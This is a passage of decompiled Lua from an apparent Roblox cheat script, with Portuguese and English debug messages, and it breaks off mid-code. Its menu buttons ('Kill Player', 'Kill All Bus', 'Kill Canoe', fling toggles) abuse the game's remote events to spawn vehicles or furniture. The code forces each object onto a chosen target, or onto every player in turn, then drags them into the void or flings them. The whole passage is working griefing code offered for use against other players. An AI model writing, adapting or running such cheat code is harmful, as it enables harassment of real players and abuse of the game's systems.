                                vu418.CFrame = CFrame.new(v427 + Vector3.new(0, 2, 0)) * CFrame.Angles(math.rad(v424), 0, 0)
                                vu422.Position = vu418.Position + Vector3.new(2, 0, 0)
                                task.wait()
                            end
                            vu422:Destroy()
                            vu417:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
                            vu417.PlatformStand = false
                            vu364.CameraSubject = vu417
                            local v428 = vu416
                            local v429, v430, v431 = pairs(v428:GetDescendants())
                            while true do
                                local v432
                                v431, v432 = v429(v430, v431)
                                if v431 == nil then
                                    break
                                end
                                if v432:IsA("BasePart") then
                                    v432.Velocity = Vector3.zero
                                    v432.RotVelocity = Vector3.zero
                                end
                            end
                            task.wait(0.1)
                            vu418.Anchored = true
                            vu418.CFrame = CFrame.new(vu420)
                            task.wait(0.001)
                            vu418.Anchored = false
                            task.wait(0.7)
                            local v433 = vu416:FindFirstChild("Couch")
                            if v433 then
                                v433.Parent = vu360.Backpack
                            end
                            task.wait(0.001)
                            vu361.RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "Couch")
                        end)
                    else
                        warn("Erro: Componentes necess\195\161rios n\195\163o encontrados")
                    end
                else
                    warn("Erro: Personagem do jogador local n\195\163o encontrado")
                    return
                end
            else
                warn("Erro: Jogador alvo n\195\163o encontrado ou sem personagem")
                return
            end
        else
            warn("Erro: Nenhum jogador selecionado")
            return
        end
    end
})
Tab10:AddSection({
    Name = "Couch without going to target"
})
Tab10:AddButton({
    Name = "Kill Player",
    Callback = function()
        local v434 = vu359:FindFirstChild(getgenv().Target)
        if not v434 then
            warn("Error: No target player selected")
            return
        end
        if not (v434.Character and v434.Character:FindFirstChild("HumanoidRootPart")) then
            warn("Error: Target player has no character or HumanoidRootPart")
            return
        end
        vu361.RE["1Clea1rTool1s"]:FireServer(unpack({
            "ClearAllTools"
        }))
        vu361.RE:FindFirstChild("1Too1l"):InvokeServer(unpack({
            "PickingTools",
            "Couch"
        }))
        local v435 = vu360.Backpack:WaitForChild("Couch", 2)
        if not v435 then
            warn("Error: Couch not found in Backpack")
            return
        end
        v435.Name = "Chaos.Couch"
        local v436 = v435:FindFirstChild("Seat1")
        local v437 = v435:FindFirstChild("Seat2")
        local v438 = v435:FindFirstChild("Handle")
        if not (v436 and (v437 and v438)) then
            warn("Error: Couch components not found")
            return
        end
        v436.Disabled = true
        v437.Disabled = true
        v438.Name = "Handle "
        v435.Parent = vu360.Character
        local v439 = Instance.new("BodyVelocity", v436)
        v439.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
        v439.P = 1250
        v439.Velocity = Vector3.new(0, 0, 0)
        v439.Name = "#mOVOOEPF$#@F$#GERE..>V<<<<EW<V<<W"
        while true do
            for _ = 1, 35 do
                local v440 = {
                    x = 0,
                    y = 0,
                    z = 0
                }
                local v441 = v434.Character
                if v441 then
                    v441 = v434.Character.HumanoidRootPart
                end
                if not v441 then
                end
                v440.x = v441.Position.X + v441.Velocity.X / 2
                v440.y = v441.Position.Y + v441.Velocity.Y / 2
                v440.z = v441.Position.Z + v441.Velocity.Z / 2
                v436.CFrame = CFrame.new(Vector3.new(v440.x, v440.y, v440.z)) * CFrame.new(- 2, 2, 0)
                task.wait()
            end
            v439:Destroy()
            v435.Parent = vu360.Backpack
            task.wait()
            v435:FindFirstChild("Handle ").Name = "Handle"
            task.wait(0.2)
            v435.Parent = vu360.Character
            task.wait()
            v435.Parent = vu360.Backpack
            v435.Handle.Name = "Handle "
            task.wait(0.2)
            v435.Parent = vu360.Character
            v439 = Instance.new("BodyVelocity", v436)
            v439.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
            v439.P = 1250
            v439.Velocity = Vector3.new(0, 0, 0)
            v439.Name = "#mOVOOEPF$#@F$#GERE..>V<<<<EW<V<<W"
            if v434.Character and (v434.Character.Humanoid and v434.Character.Humanoid.Sit == true) then
                task.wait()
                v435.Parent = vu360.Backpack
                v436.CFrame = CFrame.new(Vector3.new(9999, - 450, 9999))
                v437.CFrame = CFrame.new(Vector3.new(9999, - 450, 9999))
                v435.Parent = vu360.Character
                task.wait(0.1)
                v435.Parent = vu360.Backpack
                task.wait(2)
                local v442 = v436:FindFirstChild("#mOVOOEPF$#@F$#GERE..>V<<<<EW<V<<W")
                if v442 then
                    v442:Destroy()
                end
                vu361.RE["1Clea1rTool1s"]:FireServer("ClearAllTools")
                return
            end
        end
    end
})
Tab10:AddButton({
    Name = "Puxar Player",
    Callback = function()
        local v443 = vu359:FindFirstChild(getgenv().Target)
        if not v443 then
            warn("Erro: Nenhum jogador alvo selecionado")
            return
        end
        if not (v443.Character and v443.Character:FindFirstChild("HumanoidRootPart")) then
            warn("Error: Target player has no character or HumanoidRootPart")
            return
        end
        vu361.RE["1Clea1rTool1s"]:FireServer(unpack({
            "ClearAllTools"
        }))
        vu361.RE:FindFirstChild("1Too1l"):InvokeServer(unpack({
            "PickingTools",
            "Couch"
        }))
        local v444 = vu360.Backpack:WaitForChild("Couch", 2)
        if not v444 then
            warn("Error: Couch not found in Backpack")
            return
        end
        v444.Name = "Chaos.Couch"
        local v445 = v444:FindFirstChild("Seat1")
        local v446 = v444:FindFirstChild("Seat2")
        local v447 = v444:FindFirstChild("Handle")
        if not (v445 and (v446 and v447)) then
            warn("Error: Couch components not found")
            return
        end
        v445.Disabled = true
        v446.Disabled = true
        v447.Name = "Handle "
        v444.Parent = vu360.Character
        local v448 = Instance.new("BodyVelocity", v445)
        v448.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
        v448.P = 1250
        v448.Velocity = Vector3.new(0, 0, 0)
        v448.Name = "#mOVOOEPF$#@F$#GERE..>V<<<<EW<V<<W"
        while true do
            for _ = 1, 35 do
                local v449 = {
                    x = 0,
                    y = 0,
                    z = 0
                }
                local v450 = v443.Character
                if v450 then
                    v450 = v443.Character.HumanoidRootPart
                end
                if not v450 then
                end
                v449.x = v450.Position.X + v450.Velocity.X / 2
                v449.y = v450.Position.Y + v450.Velocity.Y / 2
                v449.z = v450.Position.Z + v450.Velocity.Z / 2
                v445.CFrame = CFrame.new(Vector3.new(v449.x, v449.y, v449.z)) * CFrame.new(- 2, 2, 0)
                task.wait()
            end
            v448:Destroy()
            v444.Parent = vu360.Backpack
            task.wait()
            v444:FindFirstChild("Handle ").Name = "Handle"
            task.wait(0.2)
            v444.Parent = vu360.Character
            task.wait()
            v444.Parent = vu360.Backpack
            v444.Handle.Name = "Handle "
            task.wait(0.2)
            v444.Parent = vu360.Character
            v448 = Instance.new("BodyVelocity", v445)
            v448.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
            v448.P = 1250
            v448.Velocity = Vector3.new(0, 0, 0)
            v448.Name = "#mOVOOEPF$#@F$#GERE..>V<<<<EW<V<<W"
            if v443.Character and (v443.Character.Humanoid and v443.Character.Humanoid.Sit == true) then
                task.wait()
                v448:Destroy()
                v444.Parent = vu360.Backpack
                task.wait()
                v444:FindFirstChild("Handle ").Name = "Handle"
                task.wait(0.3)
                v444.Parent = vu360.Character
                task.wait(0.3)
                v444.Grip = CFrame.new(Vector3.new(0, 0, 0))
                task.wait(0.3)
                vu361.RE["1Clea1rTool1s"]:FireServer("ClearAllTools")
                return
            end
        end
    end
})
Tab10:AddSection({
    Name = "Bus"
})
Tab10:AddButton({
    Name = "Kill Player",
    Callback = function()
        local vu451 = vu360.Character
        local vu452
        if vu451 then
            vu452 = vu451:FindFirstChild("HumanoidRootPart")
        else
            vu452 = vu451
        end
        if vu452 then
            local vu453 = vu452.CFrame
            local function v455()
                local v454 = game.Workspace:FindFirstChild("Vehicles")
                if v454 then
                    return v454:FindFirstChild(vu360.Name .. "Car")
                else
                    return nil
                end
            end
            local vu456 = v455()
            if not vu456 then
                vu452.CFrame = CFrame.new(1118.81, 75.998, - 1138.61)
                task.wait(0.5)
                local v457 = vu361:FindFirstChild("RE")
                if v457 and v457:FindFirstChild("1Ca1r") then
                    v457["1Ca1r"]:FireServer("PickingCar", "SchoolBus")
                end
                task.wait(1)
                vu456 = v455()
            end
            if vu456 then
                local v458 = vu456:FindFirstChild("Body")
                if v458 then
                    v458 = vu456.Body:FindFirstChild("VehicleSeat")
                end
                if v458 and (vu451:FindFirstChildOfClass("Humanoid") and not vu451.Humanoid.Sit) then
                    repeat
                        vu452.CFrame = v458.CFrame * CFrame.new(0, 2, 0)
                        task.wait()
                    until vu451.Humanoid.Sit or not vu456.Parent
                    if vu451.Humanoid.Sit or not vu456.Parent then
                        local v459, v460, v461 = pairs(vu456.Body:GetChildren())
                        while true do
                            local v462
                            v461, v462 = v459(v460, v461)
                            if v461 == nil then
                                break
                            end
                            if v462:IsA("Seat") then
                                v462.CanTouch = true
                            end
                        end
                    end
                end
            end
            local function v470()
                while true do
                    if vu365 then
                        local v463 = vu359:FindFirstChild(vu365)
                        if v463 and v463.Character and v463.Character:FindFirstChild("HumanoidRootPart") then
                            local v464 = v463.Character:FindFirstChildOfClass("Humanoid")
                            if v464 and v464.Sit then
                                if vu451.Humanoid then
                                    vu456:SetPrimaryPartCFrame(CFrame.new(Vector3.new(9999, - 450, 9999)))
                                    print("Player sat, taking bus to void!")
                                    task.wait(0.2);
                                    (function()
                                        local v465 = vu451
                                        if v465 then
                                            v465 = vu451:FindFirstChildWhichIsA("Humanoid")
                                        end
                                        if v465 then
                                            v465:ChangeState(Enum.HumanoidStateType.Jumping)
                                        end
                                    end)()
                                    print("Simulating jump!")
                                    task.wait(0.5)
                                    vu452.CFrame = vu453
                                    print("Player returned to initial position.")
                                end
                                return
                            end
                            local v466 = v463.Character.HumanoidRootPart
                            local v467 = tick() * 35
                            local v468 = math.sin(v467) * 4
                            local v469 = math.cos(v467) * 20
                            vu456:SetPrimaryPartCFrame(v466.CFrame * CFrame.new(v468, 0, v469))
                        end
                    end
                    vu363.RenderStepped:Wait()
                end
            end
            spawn(v470)
        else
            warn("Error: Local player HumanoidRootPart not found")
        end
    end
})
Tab10:AddButton({
    Name = "Puxar Player",
    Callback = function()
        local vu471 = vu360.Character
        local v472
        if vu471 then
            v472 = vu471:FindFirstChild("HumanoidRootPart")
        else
            v472 = vu471
        end
        if v472 then
            local vu473 = v472.CFrame
            local function v475()
                local v474 = game.Workspace:FindFirstChild("Vehicles")
                if v474 then
                    return v474:FindFirstChild(vu360.Name .. "Car")
                else
                    return nil
                end
            end
            local vu476 = v475()
            if not vu476 then
                v472.CFrame = CFrame.new(1118.81, 75.998, - 1138.61)
                task.wait(0.5)
                local v477 = vu361:FindFirstChild("RE")
                if v477 and v477:FindFirstChild("1Ca1r") then
                    v477["1Ca1r"]:FireServer("PickingCar", "SchoolBus")
                end
                task.wait(1)
                vu476 = v475()
            end
            if vu476 then
                local v478 = vu476:FindFirstChild("Body")
                if v478 then
                    v478 = vu476.Body:FindFirstChild("VehicleSeat")
                end
                if v478 and (vu471:FindFirstChildOfClass("Humanoid") and not vu471.Humanoid.Sit) then
                    repeat
                        v472.CFrame = v478.CFrame * CFrame.new(0, 2, 0)
                        task.wait()
                    until vu471.Humanoid.Sit or not vu476.Parent
                end
            end
            local function v485()
                while true do
                    if vu365 then
                        local v479 = vu359:FindFirstChild(vu365)
                        if v479 and v479.Character and v479.Character:FindFirstChild("HumanoidRootPart") then
                            local v480 = v479.Character:FindFirstChildOfClass("Humanoid")
                            if v480 and v480.Sit then
                                if vu471.Humanoid then
                                    vu476:SetPrimaryPartCFrame(vu473)
                                    task.wait(0.7)
                                    vu361.RE:FindFirstChild("1Ca1r"):FireServer(unpack({
                                        "DeleteAllVehicles"
                                    }))
                                end
                                return
                            end
                            local v481 = v479.Character.HumanoidRootPart
                            local v482 = tick() * 35
                            local v483 = math.sin(v482) * 4
                            local v484 = math.cos(v482) * 20
                            vu476:SetPrimaryPartCFrame(v481.CFrame * CFrame.new(v483, 0, v484))
                        end
                    end
                    vu363.RenderStepped:Wait()
                end
            end
            spawn(v485)
        else
            warn("Error: Local player HumanoidRootPart not found")
        end
    end
})
Tab10:AddButton({
    Name = "Kill All Bus",
    Callback = function()
        local vu486 = game:GetService("Players")
        local vu487 = game:GetService("Workspace")
        local vu488 = game:GetService("RunService")
        local vu489 = game:GetService("ReplicatedStorage")
        local vu490 = Vector3.new(145.51, - 374.09, 21.58)
        local vu491 = nil
        local function vu493()
            local v492 = vu487:FindFirstChild("Vehicles")
            if v492 then
                return v492:FindFirstChild(vu486.LocalPlayer.Name .. "Car")
            else
                return nil
            end
        end
        local function vu505(p494, p495)
            while true do
                if p494 then
                    local v496 = vu486:FindFirstChild(p494)
                    if v496 and v496.Character and v496.Character:FindFirstChild("HumanoidRootPart") then
                        local v497 = v496.Character:FindFirstChildOfClass("Humanoid")
                        if v497 and v497.Sit then
                            local v498 = vu493()
                            if v498 then
                                v498:SetPrimaryPartCFrame(CFrame.new(vu490))
                                print("Jogador sentou, levando \195\180nibus para o void!")
                                task.wait(0.2)
                                local function v500()
                                    local v499 = vu486.LocalPlayer.Character
                                    if v499 then
                                        v499 = vu486.LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid")
                                    end
                                    if v499 then
                                        v499:ChangeState(Enum.HumanoidStateType.Jumping)
                                    end
                                end
                                v500()
                                print("Simulating first jump!")
                                task.wait(0.4)
                                v500()
                                print("Simulating second jump!")
                                task.wait(0.5)
                                if vu491 then
                                    vu486.LocalPlayer.Character.HumanoidRootPart.CFrame = vu491
                                    print("Player returned to initial position Xique")
                                    task.wait(0.1)
                                    vu489:WaitForChild("RE"):WaitForChild("1Ca1r"):FireServer(unpack({
                                        "DeleteAllVehicles"
                                    }))
                                    print("All vehicles were deleted!")
                                end
                            end
                            if p495 then
                                p495()
                            end
                            return
                        end
                        local v501 = v496.Character.HumanoidRootPart
                        local v502 = tick() * 35
                        local _ = math.sin(v502) * 10
                        local v503 = math.cos(v502) * 20
                        local v504 = vu493()
                        if v504 then
                            v504:SetPrimaryPartCFrame(v501.CFrame * CFrame.new(0, 0, v503))
                        end
                    end
                end
                vu488.RenderStepped:Wait()
            end
        end
        local function vu515(p506, pu507)
            local vu508 = p506
            local v509 = vu486.LocalPlayer
            local v510 = v509.Character or v509.CharacterAdded:Wait()
            local v511 = v510:WaitForChild("HumanoidRootPart")
            vu491 = v511.CFrame
            local v512 = vu493()
            if not v512 then
                v511.CFrame = CFrame.new(1118.81, 75.998, - 1138.61)
                task.wait(0.5)
                local v513 = vu489:FindFirstChild("RE")
                if v513 and v513:FindFirstChild("1Ca1r") then
                    v513["1Ca1r"]:FireServer("PickingCar", "SchoolBus")
                end
                task.wait(1)
                v512 = vu493()
            end
            if v512 then
                local v514 = v512:FindFirstChild("Body")
                if v514 then
                    v514 = v512.Body:FindFirstChild("VehicleSeat")
                end
                if v514 and (v510:FindFirstChildOfClass("Humanoid") and not v510.Humanoid.Sit) then
                    repeat
                        v511.CFrame = v514.CFrame * CFrame.new(0, 2, 0)
                        task.wait()
                    until v510.Humanoid.Sit or not v512.Parent
                end
            end
            spawn(function()
                vu505(vu508, pu507)
            end)
        end
        local function vu517(pu516)
            if # pu516 ~= 0 then
                vu515(table.remove(pu516, 1).Name, function()
                    task.wait(0.5)
                    vu517(pu516)
                end)
            end
        end
        local v518 = vu486
        vu517(vu486.GetPlayers(v518))
    end
})
Tab10:AddSection({
    Name = "Canoe"
})
Tab10:AddButton({
    Name = "Kill Canoe",
    Callback = function()
        local v724 = getgenv().Target
        if v724 then
            local v725 = game.Players:FindFirstChild(v724)
            if v725 then
                local v726 = game.Players.LocalPlayer
                local vu727 = v726.Character or v726.CharacterAdded:Wait()
                local vu728 = vu727:WaitForChild("Humanoid")
                local vu729 = vu727:WaitForChild("HumanoidRootPart")
                if vu728.Sit then
                    vu728.Sit = false
                    task.wait(0.5)
                end
                vu729.CFrame = workspace.WorkspaceCom["001_CanoeCloneButton"].Button.CFrame
                task.wait(0.4)
                fireclickdetector(workspace.WorkspaceCom["001_CanoeCloneButton"].Button.ClickDetector, 0)
                task.wait(0.4)
                local vu730 = workspace.WorkspaceCom["001_CanoeStorage"].Canoe
                local vu731 = vu730:FindFirstChild("VehicleSeat")
                local v732
                if vu730.PrimaryPart then
                    v732 = 0
                else
                    vu730.PrimaryPart = vu731
                    v732 = 0
                end
                repeat
                    vu727:MoveTo(vu731.Position + Vector3.new(0, 3, 0))
                    task.wait(0.01)
                    vu731:Sit(vu728)
                    v732 = v732 + 1
                until vu728.Sit or 100 < v732
                if vu728.Sit then
                    local vu733 = v725.Character or v725.CharacterAdded:Wait()
                    local v734 = vu733
                    local vu735 = vu733.WaitForChild(v734, "HumanoidRootPart")
                    local v736 = vu733
                    local vu737 = vu733.WaitForChild(v736, "Humanoid")
                    local vu738 = Instance.new("BodyForce", vu730.PrimaryPart)
                    local vu739 = Instance.new("BodyAngularVelocity", vu730.PrimaryPart)
                    vu739.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
                    vu739.AngularVelocity = Vector3.new(5000, 25000, 5000)
                    vu739.P = 1000000000
                    local v740 = game:GetService("RunService")
                    local vu741 = true
                    local vu742 = 0
                    local vu743 = 5
                    local vu744 = 20
                    local vu745 = 10
                    local vu746 = 8
                    local vu747 = 50
                    local vu748 = nil
                    vu748 = v740.Heartbeat:Connect(function(p749)
                        if vu741 and (vu728.Sit and (vu733 and (vu737 and vu737.Health > 0))) then
                            vu742 = vu742 + p749
                            if vu737.SeatPart then
                                local v750 = CFrame.new(0, - 12000, 0)
                                for _ = 1, 30 do
                                    vu730:SetPrimaryPartCFrame(v750)
                                    vu727:SetPrimaryPartCFrame(v750)
                                    vu733:SetPrimaryPartCFrame(v750)
                                    task.wait()
                                end
                                if vu731 then
                                    vu731.Throttle = 0
                                    vu731.Steer = 0
                                end
                                if vu730:FindFirstChild("BodyVelocity") then
                                    vu730.BodyVelocity.Velocity = Vector3.new(0, 0, 0)
                                end
                                if vu730:FindFirstChild("BodyAngularVelocity") then
                                    vu730.BodyAngularVelocity.AngularVelocity = Vector3.new(0, 0, 0)
                                end
                                if vu729.Position.Y < - 1000 then
                                    vu728.Sit = false
                                    task.wait(0.2)
                                    vu729.CFrame = CFrame.new(1118.81, 75.998, - 1138.61)
                                    task.wait(0.2)
                                    pcall(function()
                                        if vu730 and vu730.Parent then
                                            vu730:Destroy()
                                        end
                                    end)
                                end
                                vu741 = false
                                vu748:Disconnect()
                                vu739:Destroy()
                                vu738:Destroy()
                            else
                                local v751 = vu743 + math.sin(vu742 * 10) * (vu744 - vu743) / 2
                                local v752 = vu747 * vu742
                                local v753 = math.cos(v752) * v751
                                local v754 = math.sin(v752) * v751
                                local v755 = vu735.CFrame.LookVector * math.sin(vu742 * vu746) * vu745
                                local v756 = vu735.Position + Vector3.new(v753, 5, v754) + v755
                                vu730:SetPrimaryPartCFrame(CFrame.new(v756, vu735.Position))
                                vu738.Force = (vu735.Position - vu730.PrimaryPart.Position).Unit * 1000000 + Vector3.new(0, workspace.Gravity * vu730.PrimaryPart:GetMass(), 0)
                            end
                        else
                            vu748:Disconnect()
                            vu739:Destroy()
                            vu738:Destroy()
                            return
                        end
                    end)
                else
                    warn("Failed to sit in boat.")
                end
            else
                warn("Jogador n\195\163o encontrado.")
                return
            end
        else
            warn("Nenhum jogador definido.")
            return
        end
    end
})
Tab10:AddSection({
    Name = "Fling"
})
Tab10:AddToggle({
    Name = "Fling - Boat",
    Default = false,
    Callback = function(p765)
        if vu764 then
            vu764 = false
        elseif p765 then
            if not (vu365 and game.Players:FindFirstChild(vu365)) then
                warn("No player selected or does not exist")
                return
            end
            local vu766 = game.Players.LocalPlayer
            local vu767 = vu766.Character
            local v768
            if vu767 then
                v768 = vu767:FindFirstChildOfClass("Humanoid")
            else
                v768 = vu767
            end
            if vu767 then
                vu767 = vu767:FindFirstChild("HumanoidRootPart")
            end
            local vu769 = game.Workspace:FindFirstChild("Vehicles")
            if not (v768 and vu767) then
                warn("Invalid Humanoid or RootPart")
                return
            end
            local vu770 = vu769:FindFirstChild(vu766.Name .. "Car") or (function()
                vu767.CFrame = CFrame.new(1754, - 2, 58)
                task.wait(0.5)
                game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer("PickingBoat", "MilitaryBoatFree")
                task.wait(1)
                return vu769:FindFirstChild(vu766.Name .. "Car")
            end)()
            if not vu770 then
                warn("Failed to spawn boat")
                return
            end
            local v771 = vu770:FindFirstChild("Body")
            if v771 then
                v771 = vu770.Body:FindFirstChild("VehicleSeat")
            end
            if not v771 then
                warn("Seat not found")
                return
            end
            repeat
                task.wait(0.1)
                vu767.CFrame = v771.CFrame * CFrame.new(0, 1, 0)
            until v768.SeatPart == v771
            print("Boat spawned!")
            local v772 = game.Players:FindFirstChild(vu365)
            if not (v772 and v772.Character) then
                warn("Player not found")
                return
            end
            local v773 = v772.Character
            local v774 = v773:FindFirstChildOfClass("Humanoid")
            local vu775 = v773:FindFirstChild("HumanoidRootPart")
            if not (vu775 and v774) then
                warn("Target Humanoid or RootPart not found")
                return
            end
            local vu776 = Instance.new("BodyAngularVelocity")
            vu776.Name = "Spinning"
            vu776.Parent = vu770.PrimaryPart
            vu776.MaxTorque = Vector3.new(0, math.huge, 0)
            vu776.AngularVelocity = Vector3.new(0, 369, 0)
            print("Fling active!")
            local function vu779(p777, p778)
                if vu770 and vu770.PrimaryPart then
                    vu770:SetPrimaryPartCFrame(CFrame.new(p777.Position + p778))
                end
            end
            task.spawn(function()
                while vu770 and (vu770.Parent and (vu775 and vu775.Parent)) do
                    task.wait(0.01)
                    vu779(vu775, Vector3.new(0, 1, 0))
                    vu779(vu775, Vector3.new(0, - 2.25, 5))
                    vu779(vu775, Vector3.new(0, 2.25, 0.25))
                    vu779(vu775, Vector3.new(- 2.25, - 1.5, 2.25))
                    vu779(vu775, Vector3.new(0, 1.5, 0))
                    vu779(vu775, Vector3.new(0, - 1.5, 0))
                    if vu770 and vu770.PrimaryPart then
                        local v780 = CFrame.Angles(math.rad(math.random(- 369, 369)), math.rad(math.random(- 369, 369)), math.rad(math.random(- 369, 369)))
                        vu770:SetPrimaryPartCFrame(CFrame.new(vu775.Position + Vector3.new(0, 1.5, 0)) * v780)
                    end
                end
                if vu776 and vu776.Parent then
                    vu776:Destroy()
                    print("Fling deactivated")
                end
            end)
        else
            local v781 = game.Players.LocalPlayer
            local v782 = v781.Character
            local v783
            if v782 then
                v783 = v782:FindFirstChild("HumanoidRootPart")
            else
                v783 = v782
            end
            if v782 then
                v782 = v782:FindFirstChildOfClass("Humanoid")
            end
            local v784 = game.Workspace:FindFirstChild("Vehicles")
            if not (v783 and v782) then
                warn("No RootPart or Humanoid found!")
                return
            end
            v782.PlatformStand = true
            print("Player paralyzed to reduce spin effects.")
            local v785, v786, v787 = pairs(v783:GetChildren())
            while true do
                local v788
                v787, v788 = v785(v786, v787)
                if v787 == nil then
                    break
                end
                if v788:IsA("BodyAngularVelocity") or v788:IsA("BodyVelocity") then
                    v788:Destroy()
                end
            end
            print("Spin and forces removed from player.")
            game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer("DeleteAllVehicles")
            task.wait(0.5)
            if v784 then
                v784 = v784:FindFirstChild(v781.Name .. "Car")
            end
            if v784 and v784.PrimaryPart then
                local v789, v790, v791 = pairs(v784.PrimaryPart:GetChildren())
                while true do
                    local v792
                    v791, v792 = v789(v790, v791)
                    if v791 == nil then
                        break
                    end
                    if v792:IsA("BodyAngularVelocity") or v792:IsA("BodyVelocity") then
                        v792:Destroy()
                    end
                end
                print("Spin removed from boat.")
            end
            task.wait(1)
            local v793 = Vector3.new(0, 1000, 0)
            local v794 = Instance.new("BodyPosition", v783)
            v794.Position = v793
            v794.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
            local v795 = Instance.new("BodyGyro", v783)
            v795.CFrame = v783.CFrame
            v795.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
            print("Player is stuck at safe coordinate.")
            task.wait(3)
            v794:Destroy()
            v795:Destroy()
            v782.PlatformStand = false
            print("Player released, safe at position.")
        end
    end
})
print("Fling - Boat button created")
local vu796 = true
local vu797 = true
Tab10:AddToggle({
    Name = "Fling Truck",
    Default = false,
    Callback = function(p800)
        if vu796 then
            vu796 = false
        elseif p800 then
            vu687(vu365)
        else
            local v801 = game:GetService("Players").LocalPlayer.Character
            local v802 = v801:GetPivot()
            v801:PivotTo(CFrame.new(1109.56591796875, 93.420654296875, - 1236.69580078125))
            task.wait(0.5)
            game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer(unpack({
                "PickingCar",
                "TowTruck"
            }))
            task.wait(0.5)
            v801:PivotTo(v802)
        end
    end
})
local vu823 = true
Tab10:AddToggle({
    Name = "Fling Canoe",
    Description = "By Shelby",
    Default = false,
    Callback = function(p824)
        if vu823 then
            vu823 = false
        elseif p824 then
            local v825 = getgenv().Target
            if not v825 then
                warn("No player defined.")
                return
            end
            local v826 = game.Players:FindFirstChild(v825)
            if not v826 then
                warn("Jogador n\195\163o encontrado.")
                return
            end
            local v827 = game.Players.LocalPlayer
            local v828 = v827.Character or v827.CharacterAdded:Wait()
            local vu829 = v828:WaitForChild("Humanoid")
            local v830 = v828:WaitForChild("HumanoidRootPart")
            if vu829.Sit then
                vu829.Sit = false
                task.wait(0.5)
            end
            v830.CFrame = workspace.WorkspaceCom["001_CanoeCloneButton"].Button.CFrame
            task.wait(0.4)
            fireclickdetector(workspace.WorkspaceCom["001_CanoeCloneButton"].Button.ClickDetector, 0)
            task.wait(0.4)
            local vu831 = workspace.WorkspaceCom["001_CanoeStorage"].Canoe
            local v832 = vu831:FindFirstChild("VehicleSeat")
            local v833
            if vu831.PrimaryPart then
                v833 = 0
            else
                vu831.PrimaryPart = v832
                v833 = 0
            end
            repeat
                v828:MoveTo(v832.Position + Vector3.new(0, 3, 0))
                task.wait(0.01)
                v832:Sit(vu829)
                v833 = v833 + 1
            until vu829.Sit or 100 < v833
            if not vu829.Sit then
                warn("Falhou em sentar no barco.")
                return
            end
            local vu834 = v826.Character or v826.CharacterAdded:Wait()
            local v835 = vu834
            local vu836 = vu834.WaitForChild(v835, "HumanoidRootPart")
            local v837 = vu834
            local vu838 = vu834.WaitForChild(v837, "Humanoid")
            local vu839 = Instance.new("BodyForce", vu831.PrimaryPart)
            local vu840 = Instance.new("BodyAngularVelocity", vu831.PrimaryPart)
            vu840.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
            vu840.AngularVelocity = Vector3.new(5000, 25000, 5000)
            vu840.P = 1000000000
            local v841 = game:GetService("RunService")
            local vu842 = true
            local vu843 = 0
            local vu844 = 5
            local vu845 = 20
            local vu846 = 35
            local vu847 = 35
            local vu848 = 50
            local vu849 = nil
            vu849 = v841.Heartbeat:Connect(function(p850)
                if vu842 and (vu829.Sit and (vu834 and (vu838 and vu838.Health > 0))) then
                    vu843 = vu843 + p850
                    local v851 = vu844 + math.sin(vu843 * 10) * (vu845 - vu844) / 2
                    local v852 = vu848 * vu843
                    local v853 = math.cos(v852) * v851
                    local v854 = math.sin(v852) * v851
                    local v855 = vu836.CFrame.LookVector * math.sin(vu843 * vu847) * vu846
                    local v856 = vu836.Position + Vector3.new(v853, 5, v854) + v855
                    vu831:SetPrimaryPartCFrame(CFrame.new(v856, vu836.Position))
                    vu839.Force = (vu836.Position - vu831.PrimaryPart.Position).Unit * 1000000 + Vector3.new(0, workspace.Gravity * vu831.PrimaryPart:GetMass(), 0)
                else
                    vu849:Disconnect()
                    vu840:Destroy()
                    vu839:Destroy()
                end
            end)
        else
            getgenv().FlingAtivo = false
            local v857 = game.Players.LocalPlayer
            local v858 = v857.Character or v857.CharacterAdded:Wait()
            local v859 = v858:FindFirstChild("Humanoid")
            local v860 = v858:FindFirstChild("HumanoidRootPart")
            if not (v859 and v860) then
                return
            end
            if v859.Sit then
                v859.Sit = false
                task.wait(0.3)
            end
            local v861 = workspace:FindFirstChild("WorkspaceCom")
            if v861 then
                local vu862 = v861:FindFirstChild("001_CanoeStorage")
                if vu862 and vu862:FindFirstChild("Canoe") then
                    pcall(function()
                        vu862.Canoe:Destroy()
                    end)
                end
            end
            local v863 = getgenv().RetornoPos or Vector3.new(1118.81, 75.998, - 1138.61)
            v860.CFrame = CFrame.new(v863)
            v859:ChangeState(Enum.HumanoidStateType.Physics)
            v860.Anchored = true
            v860.CFrame = CFrame.new(v863)
            v860.AssemblyLinearVelocity = Vector3.zero
            v860.AssemblyAngularVelocity = Vector3.zero
            print("Player teleported to safe position.");
            (function()
                local v864 = game.Players:FindFirstChild(getgenv().Target)
                if v864 and v864.Character then
                    local v865, v866, v867 = ipairs(v864.Character:GetDescendants())
                    while true do
                        local v868
                        v867, v868 = v865(v866, v867)
                        if v867 == nil then
                            break
                        end
                        if v868:IsA("BodyVelocity") or v868:IsA("Attachment") then
                            v868:Destroy()
                        end
                    end
                end
            end)()
            task.wait(2)
            v860.Anchored = false
            v859:ChangeState(Enum.HumanoidStateType.GettingUp)
            print("Player released safely.")
        end
    end
})
Tab10:AddToggle({
    Name = "Couch Fling",
    Default = false,
    Callback = function(p869)
        vu630 = p869
        if p869 and vu365 then
            local vu870 = vu713:FindFirstChild(vu365)
            if not (vu870 and vu870.Character) then
                return
            end
            local vu871 = vu628.Character
            if vu871 then
                vu871 = vu628.Character:FindFirstChild("HumanoidRootPart")
            end
            local v872 = vu870.Character
            if v872 then
                v872 = vu870.Character:FindFirstChild("HumanoidRootPart")
            end
            if not (vu871 and v872) then
                return
            end
            local vu873 = vu628.Character
            local vu874 = vu873:FindFirstChildOfClass("Humanoid")
            local vu875 = vu871.CFrame
            game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer(unpack({
                "ClearAllTools"
            }))
            task.wait(0.2)
            local vu876 = {
